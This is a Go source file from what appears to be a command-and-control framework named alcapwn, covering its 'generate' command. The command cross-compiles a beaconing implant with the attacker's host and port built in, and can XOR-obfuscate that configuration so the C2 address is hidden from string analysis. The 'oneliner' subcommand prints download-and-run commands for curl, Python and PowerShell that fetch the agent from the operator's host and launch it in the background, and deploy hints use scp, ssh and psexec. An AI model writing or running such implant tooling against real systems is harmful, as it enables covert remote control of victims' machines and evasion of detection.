package main

// cmd_generate.go — agent payload generator.
//
// The 'generate' command cross-compiles the alcapwn agent for a target
// platform and injects C2 configuration (LHOST, LPORT, transport, fingerprint)
// at build time via -ldflags.
//
// Requirements:
//   - Go toolchain in PATH (go build)
//   - alcapwn source tree accessible (detected via 'go env GOMOD')
//
// Commands:
//   generate list                                   — list supported targets
//   generate <os> <arch> --lhost X [options]        — build agent binary
//   generate oneliner <os> <arch> --lhost X [...]   — print deploy one-liner
//
// The server fingerprint is pinned by default (from --serverFingerprint set
// at startup).  Pass --no-pin to produce an unpinned agent (dev/CTF only).

import (
	"bytes"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

// ── Target table ──────────────────────────────────────────────────────────────

type generateTarget struct {
	GOOS   string
	GOARCH string
	GOARM  string // non-empty only for arm/ARMv7
	Name   string // display + default filename stem
	Ext    string // "" for ELF, ".exe" for Windows PE
}

var generateTargets = []generateTarget{
	{GOOS: "linux", GOARCH: "amd64", Name: "linux-amd64"},
	{GOOS: "linux", GOARCH: "arm64", Name: "linux-arm64"},
	{GOOS: "linux", GOARCH: "arm", GOARM: "7", Name: "linux-armv7"},
	{GOOS: "linux", GOARCH: "386", Name: "linux-i386"},
	{GOOS: "freebsd", GOARCH: "amd64", Name: "freebsd-amd64"},
	{GOOS: "netbsd", GOARCH: "amd64", Name: "netbsd-amd64"},
	{GOOS: "darwin", GOARCH: "amd64", Name: "macos-x86_64"},
	{GOOS: "darwin", GOARCH: "arm64", Name: "macos-aarch64"},
	{GOOS: "windows", GOARCH: "amd64", Name: "windows-amd64", Ext: ".exe"},
	{GOOS: "windows", GOARCH: "386", Name: "windows-i386", Ext: ".exe"},
	{GOOS: "windows", GOARCH: "arm64", Name: "windows-arm64", Ext: ".exe"},
}

// lookupTarget finds a target by GOOS + GOARCH (case-insensitive).
// Also accepts "armv7" as an alias for arm/GOARM=7.
func lookupTarget(goos, goarch string) *generateTarget {
	goos = strings.ToLower(goos)
	goarch = strings.ToLower(goarch)
	if goarch == "armv7" {
		goarch = "arm"
	}
	for i := range generateTargets {
		t := &generateTargets[i]
		if t.GOOS == goos && t.GOARCH == goarch {
			return t
		}
	}
	return nil
}

// ── Options ───────────────────────────────────────────────────────────────────

type generateOpts struct {
	target           *generateTarget
	lhost            string
	lport            string
	transport        string
	interval         string
	jitter           string
	out              string
	noPin            bool
	obfuscate        bool
	httpUA           string
	httpRegisterPath string
	httpBeaconPath   string
}

// defaultOut returns the default output filename for this build.
func (o *generateOpts) defaultOut() string {
	name := "agent-" + o.target.Name
	if o.transport == "http" {
		name += "-http"
	}
	return name + o.target.Ext
}

// ── Command entry point ───────────────────────────────────────────────────────

func (c *Console) cmdGenerate(args []string) {
	if len(args) == 0 {
		printGenerateUsage()
		return
	}
	switch strings.ToLower(args[0]) {
	case "list":
		printGenerateTargets()
	case "oneliner":
		c.cmdGenerateOneliner(args[1:])
	default:
		c.cmdGenerateBuild(args)
	}
}

// ── Build subcommand ──────────────────────────────────────────────────────────

func (c *Console) cmdGenerateBuild(args []string) {
	opts, ok := parseGenerateArgs(args, c)
	if !ok {
		return
	}

	modRoot, err := findModuleRoot()
	if err != nil {
		fmt.Printf("[!] Cannot locate alcapwn source: %v\n", err)
		fmt.Println("[!] The 'generate' command requires the Go toolchain and source tree.")
		fmt.Println("[!] Run alcapwn from its repository root directory.")
		return
	}

	if opts.out == "" {
		opts.out = opts.defaultOut()
	}

	ldflags := buildGenerateLDFlags(opts, c)
	fmt.Printf("[*] Building agent (%s/%s, %s transport)...\n",
		opts.target.GOOS, opts.target.GOARCH, opts.transport)

	start := time.Now()
	if err := buildAgentBinary(modRoot, opts, ldflags); err != nil {
		fmt.Printf("[!] Build failed:\n%s\n", err)
		return
	}
	elapsed := time.Since(start)

	// Resolve output path (may be relative).
	outPath := opts.out
	if !filepath.IsAbs(outPath) {
		cwd, _ := os.Getwd()
		outPath = filepath.Join(cwd, outPath)
	}

	info, err := os.Stat(outPath)
	if err != nil {
		fmt.Printf("[!] Could not stat output: %v\n", err)
		return
	}

	sizeMB := float64(info.Size()) / 1024 / 1024
	fmt.Printf("[+] %s (%.1f MB) — %.1fs\n", opts.out, sizeMB, elapsed.Seconds())
	fmt.Printf("[*] Beacon: %s://%s:%s | interval=%ss ±%s%%\n",
		opts.transport, opts.lhost, opts.lport, opts.interval, opts.jitter)

	if opts.noPin {
		fmt.Println("[!] WARNING: fingerprint pinning disabled — agent accepts any server key")
	} else if c.opts.serverFingerprint != "" {
		fmt.Printf("[*] Fingerprint pinned: %.16s...\n", c.opts.serverFingerprint)
	} else {
		fmt.Println("[!] No server fingerprint available — agent built without pinning")
	}
	if opts.obfuscate {
		fmt.Println("[*] Obfuscation: enabled (XOR, 16-byte random key)")
	}
	if opts.transport == "http" {
		rp := opts.httpRegisterPath
		if rp == "" {
			rp = "/register"
		}
		bp := opts.httpBeaconPath
		if bp == "" {
			bp = "/beacon/"
		}
		fmt.Printf("[*] HTTP paths: register=%s beacon=%s\n", rp, bp)
		if opts.httpUA != "" {
			fmt.Printf("[*] User-Agent: %s\n", opts.httpUA)
		}
		if rp != "/register" || bp != "/beacon/" {
			fmt.Printf("[!] Start listener: listen http :%s --register %s --beacon %s\n",
				opts.lport, rp, bp)
		}
	}
	printDeployHint(opts.out, opts.target)
}

// ── Oneliner subcommand ───────────────────────────────────────────────────────

func (c *Console) cmdGenerateOneliner(args []string) {
	opts, ok := parseGenerateArgs(args, c)
	if !ok {
		return
	}

	if opts.out == "" {
		opts.out = opts.defaultOut()
	}

	// Assume the operator is serving the binary on port 8000.
	agentURL := fmt.Sprintf("http://%s:8000/%s", opts.lhost, opts.out)

	switch opts.target.GOOS {
	case "windows":
		fmt.Println("[*] Windows — PowerShell:")
		fmt.Printf("    $p=\"$env:TEMP\\%s\"; iwr '%s' -OutFile $p; Start-Process $p\n",
			opts.out, agentURL)
	default:
		fmt.Println("[*] Linux / macOS — curl:")
		fmt.Printf("    curl -fsSL '%s' -o /tmp/.a && chmod +x /tmp/.a && nohup /tmp/.a &\n", agentURL)
		fmt.Println()
		fmt.Println("[*] Linux / macOS — Python (no curl):")
		fmt.Printf("    python3 -c \"import urllib.request,os,subprocess; urllib.request.urlretrieve('%s','/tmp/.a'); os.chmod('/tmp/.a',0o755); subprocess.Popen(['/tmp/.a'])\"\n", agentURL)
	}

	fmt.Printf("\n[*] Serve binary with:  python3 -m http.server 8000  (in the directory containing %s)\n", opts.out)
	fmt.Printf("[*] Build first:        generate %s %s --lhost %s --lport %s --transport %s\n",
		opts.target.GOOS, opts.target.GOARCH, opts.lhost, opts.lport, opts.transport)
}

// ── Helpers ───────────────────────────────────────────────────────────────────

// parseGenerateArgs parses "<os> <arch> [flags...]" from args.
func parseGenerateArgs(args []string, c *Console) (generateOpts, bool) {
	if len(args) < 2 {
		printGenerateUsage()
		return generateOpts{}, false
	}

	target := lookupTarget(args[0], args[1])
	if target == nil {
		fmt.Printf("[!] Unsupported target: %s/%s\n", args[0], args[1])
		fmt.Println("[!] Run 'generate list' to see supported targets.")
		return generateOpts{}, false
	}

	opts := generateOpts{
		target:    target,
		lport:     "443",
		transport: "tcp",
		interval:  "60",
		jitter:    "20",
	}

	rest := args[2:]
	for i := 0; i < len(rest); i++ {
		switch rest[i] {
		case "--lhost":
			if i+1 >= len(rest) {
				fmt.Println("[!] --lhost requires a value")
				return generateOpts{}, false
			}
			i++
			opts.lhost = rest[i]
		case "--lport":
			if i+1 >= len(rest) {
				fmt.Println("[!] --lport requires a value")
				return generateOpts{}, false
			}
			i++
			opts.lport = rest[i]
		case "--transport":
			if i+1 >= len(rest) {
				fmt.Println("[!] --transport requires 'tcp' or 'http'")
				return generateOpts{}, false
			}
			i++
			opts.transport = rest[i]
			if opts.transport != "tcp" && opts.transport != "http" {
				fmt.Printf("[!] --transport must be 'tcp' or 'http', got %q\n", opts.transport)
				return generateOpts{}, false
			}
		case "--interval":
			if i+1 >= len(rest) {
				fmt.Println("[!] --interval requires a value")
				return generateOpts{}, false
			}
			i++
			opts.interval = rest[i]
		case "--jitter":
			if i+1 >= len(rest) {
				fmt.Println("[!] --jitter requires a value")
				return generateOpts{}, false
			}
			i++
			opts.jitter = rest[i]
		case "--out":
			if i+1 >= len(rest) {
				fmt.Println("[!] --out requires a filename")
				return generateOpts{}, false
			}
			i++
			opts.out = rest[i]
		case "--no-pin":
			opts.noPin = true
		case "--obfuscate":
			opts.obfuscate = true
		case "--http-ua":
			if i+1 >= len(rest) {
				fmt.Println("[!] --http-ua requires a value")
				return generateOpts{}, false
			}
			i++
			opts.httpUA = rest[i]
		case "--http-register-path":
			if i+1 >= len(rest) {
				fmt.Println("[!] --http-register-path requires a value")
				return generateOpts{}, false
			}
			i++
			opts.httpRegisterPath = rest[i]
		case "--http-beacon-path":
			if i+1 >= len(rest) {
				fmt.Println("[!] --http-beacon-path requires a value")
				return generateOpts{}, false
			}
			i++
			opts.httpBeaconPath = rest[i]
		default:
			fmt.Printf("[!] Unknown flag: %s\n", rest[i])
			printGenerateUsage()
			return generateOpts{}, false
		}
	}

	if opts.lhost == "" {
		fmt.Println("[!] --lhost is required")
		printGenerateUsage()
		return generateOpts{}, false
	}
	return opts, true
}

// buildGenerateLDFlags constructs the -ldflags string for the agent binary.
// When opts.obfuscate is set, sensitive config strings are XOR-encoded with a
// random per-build key; the plain vars are cleared so only enc variants work.
func buildGenerateLDFlags(opts generateOpts, c *Console) string {
	fp := ""
	if !opts.noPin {
		fp = c.opts.serverFingerprint
	}

	var flags []string

	// HTTP customisation flags (always plain — not security-sensitive).
	if opts.httpUA != "" {
		flags = append(flags, fmt.Sprintf("-X 'main.httpUA=%s'", opts.httpUA))
	}
	if opts.httpRegisterPath != "" {
		flags = append(flags, fmt.Sprintf("-X main.httpRegisterPath=%s", opts.httpRegisterPath))
	}
	if opts.httpBeaconPath != "" {
		flags = append(flags, fmt.Sprintf("-X main.httpBeaconPath=%s", opts.httpBeaconPath))
	}

	if opts.obfuscate {
		key := xorGenKey(16) // 16 random bytes
		keyHex := hex.EncodeToString(key)
		flags = append(flags,
			fmt.Sprintf("-X main.xorKey=%s", keyHex),
			// Encoded sensitive values.
			fmt.Sprintf("-X main.lhostEnc=%s", xorEncodeStr(opts.lhost, key)),
			fmt.Sprintf("-X main.lportEnc=%s", xorEncodeStr(opts.lport, key)),
			fmt.Sprintf("-X main.transportEnc=%s", xorEncodeStr(opts.transport, key)),
			fmt.Sprintf("-X main.intervalEnc=%s", xorEncodeStr(opts.interval, key)),
			fmt.Sprintf("-X main.jitterEnc=%s", xorEncodeStr(opts.jitter, key)),
			// Clear plain vars so they don't appear in strings output.
			"-X main.lhost=",
			"-X main.lport=",
			"-X main.transport=",
			"-X main.interval=",
			"-X main.jitter=",
		)
		if fp != "" {
			flags = append(flags,
				fmt.Sprintf("-X main.serverFingerprintEnc=%s", xorEncodeStr(fp, key)),
				"-X main.serverFingerprint=",
			)
		}
	} else {
		flags = append(flags,
			fmt.Sprintf("-X main.lhost=%s", opts.lhost),
			fmt.Sprintf("-X main.lport=%s", opts.lport),
			fmt.Sprintf("-X main.transport=%s", opts.transport),
			fmt.Sprintf("-X main.interval=%s", opts.interval),
			fmt.Sprintf("-X main.jitter=%s", opts.jitter),
		)
		if fp != "" {
			flags = append(flags, fmt.Sprintf("-X main.serverFingerprint=%s", fp))
		}
	}

	return strings.Join(flags, " ")
}

// ── XOR helpers (server-side only) ───────────────────────────────────────────

// xorGenKey generates n cryptographically random bytes for use as a XOR key.
func xorGenKey(n int) []byte {
	key := make([]byte, n)
	if _, err := rand.Read(key); err != nil {
		panic("rand.Read: " + err.Error())
	}
	return key
}

// xorEncodeStr XOR-encodes s with key and returns the result as a lowercase hex string.
func xorEncodeStr(s string, key []byte) string {
	b := []byte(s)
	for i := range b {
		b[i] ^= key[i%len(key)]
	}
	return hex.EncodeToString(b)
}

// buildAgentBinary runs go build for the agent with the given options.
func buildAgentBinary(modRoot string, opts generateOpts, ldflags string) error {
	// Resolve output to an absolute path so it lands in CWD regardless of
	// where go build is invoked from (modRoot may differ from CWD).
	outPath := opts.out
	if !filepath.IsAbs(outPath) {
		cwd, err := os.Getwd()
		if err != nil {
			return fmt.Errorf("getwd: %w", err)
		}
		outPath = filepath.Join(cwd, outPath)
	}

	env := append(os.Environ(),
		"CGO_ENABLED=0",
		"GOOS="+opts.target.GOOS,
		"GOARCH="+opts.target.GOARCH,
	)
	if opts.target.GOARM != "" {
		env = append(env, "GOARM="+opts.target.GOARM)
	}

	var stderr bytes.Buffer
	cmd := exec.Command("go", "build",
		"-ldflags", ldflags+" -s -w",
		"-o", outPath,
		"./agent/",
	)
	cmd.Dir = modRoot
	cmd.Env = env
	cmd.Stderr = &stderr

	if err := cmd.Run(); err != nil {
		if stderr.Len() > 0 {
			return fmt.Errorf("%v\n%s", err, strings.TrimSpace(stderr.String()))
		}
		return err
	}
	return nil
}

// findModuleRoot locates the alcapwn module root directory by asking the Go
// toolchain where the current go.mod lives.  Returns an error if the Go
// toolchain is not in PATH or alcapwn is not running from its source tree.
func findModuleRoot() (string, error) {
	out, err := exec.Command("go", "env", "GOMOD").Output()
	if err != nil {
		return "", fmt.Errorf("go toolchain not in PATH: %w", err)
	}
	modFile := strings.TrimSpace(string(out))
	if modFile == "" || modFile == os.DevNull {
		return "", fmt.Errorf("not inside a Go module; run alcapwn from its source directory")
	}
	dir := filepath.Dir(modFile)
	// Sanity-check: the module must contain an agent/ subdirectory.
	if _, err := os.Stat(filepath.Join(dir, "agent")); os.IsNotExist(err) {
		return "", fmt.Errorf("module at %s has no agent/ directory (wrong source tree?)", dir)
	}
	return dir, nil
}

// printDeployHint prints a copy+paste deploy snippet for the built binary.
func printDeployHint(outFile string, t *generateTarget) {
	switch t.GOOS {
	case "windows":
		fmt.Printf("[*] Deploy: copy %s target && psexec \\\\target cmd /c %s\n", outFile, outFile)
	case "darwin":
		fmt.Printf("[*] Deploy: scp %s user@target:/tmp/.a && ssh user@target '/tmp/.a &'\n", outFile)
	default: // linux, freebsd, netbsd
		fmt.Printf("[*] Deploy: scp %s user@target:/tmp/.a && ssh user@target 'chmod +x /tmp/.a && /tmp/.a &'\n", outFile)
	}
}

// ── Display helpers ───────────────────────────────────────────────────────────

func printGenerateTargets() {
	fmt.Printf("  %-20s  %-9s  %-8s  %s\n", "Name", "GOOS", "GOARCH", "Notes")
	fmt.Printf("  %-20s  %-9s  %-8s  %s\n",
		strings.Repeat("─", 20), strings.Repeat("─", 9),
		strings.Repeat("─", 8), strings.Repeat("─", 10))
	for _, t := range generateTargets {
		var notes []string
		if t.GOARM != "" {
			notes = append(notes, "GOARM="+t.GOARM)
		}
		if t.Ext != "" {
			notes = append(notes, "PE binary")
		}
		fmt.Printf("  %-20s  %-9s  %-8s  %s\n",
			t.Name, t.GOOS, t.GOARCH, strings.Join(notes, ", "))
	}
}

func printGenerateUsage() {
	fmt.Print(`Usage:
  generate list
  generate <os> <arch> --lhost <host> [options]
  generate oneliner <os> <arch> --lhost <host> [options]

Options:
  --lhost <host>             C2 listener IP or hostname (required)
  --lport <port>             listener port (default: 443)
  --transport <t>            tcp or http (default: tcp)
  --interval <s>      beacon interval in seconds (default: 60)
  --jitter <pct>      jitter percentage 0–50 (default: 20)
  --out <file>        output filename (default: agent-<target>[-http][.exe])
  --no-pin                   omit certificate pinning (dev/CTF testing only)
  --obfuscate                XOR-encode config strings (hides C2 IP from strings(1))
  --http-ua <ua>             custom User-Agent header for HTTP transport
  --http-register-path <p>   server registration URI (default: /register)
  --http-beacon-path <p>     server beacon URI prefix (default: /beacon/)

Examples:
  generate linux amd64 --lhost 10.0.0.1
  generate linux amd64 --lhost 10.0.0.1 --transport http --obfuscate
  generate linux amd64 --lhost 10.0.0.1 --transport http \
    --http-register-path /api/v1/status --http-beacon-path /cdn/
  generate windows amd64 --lhost 10.0.0.1 --out beacon.exe --obfuscate
  generate oneliner linux amd64 --lhost 10.0.0.1
`)
}
